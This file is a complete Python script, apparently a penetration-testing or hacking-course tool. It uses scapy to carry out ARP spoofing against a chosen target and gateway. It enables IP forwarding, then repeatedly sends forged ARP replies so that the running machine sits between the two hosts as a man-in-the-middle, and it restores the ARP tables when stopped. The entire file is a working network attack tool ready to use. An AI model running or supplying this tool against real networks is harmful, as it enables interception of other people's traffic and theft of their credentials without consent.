import scapy.all as scapy
import optparse
import time
import os
import sys


IFACE = "wlan0"   # eth0 linux


def check_super_user():
    return os.geteuid() == 0


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-r", "--gateway", dest="gateway", help="Gateway IP")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error('[!] Please specify a target, use --help for more info.')
    if not options.gateway:
        parser.error('[!] Please specify a gateway, use --help for more info.')
    return options


def enable_forwarding():
    if IFACE == 'wlan0':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    elif IFACE == 'en0':  # OSX
        os.system("sysctl -w net.inet.ip.forwarding=1")


def restore(destination_ip, source_ip):
    packet = scapy.ARP(
        op=2,   # op == 2 -> because we only want to create a response, not also a request.
        pdst=destination_ip, 
        hwdst=get_mac(destination_ip), 
        psrc=source_ip,
        hwsrc=get_mac(source_ip)
    )
    scapy.send(packet, count=4, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    # Get only the answered ones.
    if answered:
        if answered[0][1].hwsrc:
            return answered[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(
        op=2,   # op == 2 -> because we only want to create a response, not also a request.
        pdst=target_ip, 
        hwdst=get_mac(target_ip),
        psrc=spoof_ip
    )
    scapy.send(packet, verbose=False)   # Not output


if __name__ == '__main__':
    if check_super_user():
        sent_packets_count = 0
        enable_forwarding()
        target_ip, gateway = get_arguments().target, get_arguments().gateway
        if target_ip and gateway:
            try:
                while True:
                    spoof(target_ip, gateway)
                    spoof(gateway, target_ip)
                    sent_packets_count += 2
                    print("\r[-] Packets sent: {}".format(sent_packets_count), end="")
                    time.sleep(2)
            except KeyboardInterrupt:
                print("\n[+] Detected CTRL + C ... Restoring")
                restore(target_ip, gateway)
                restore(gateway, target_ip)
        else:
            print('[!] Please add Target IP and/or Gateway.')
    else:
        print('[!] Access denied. Please SUDO!')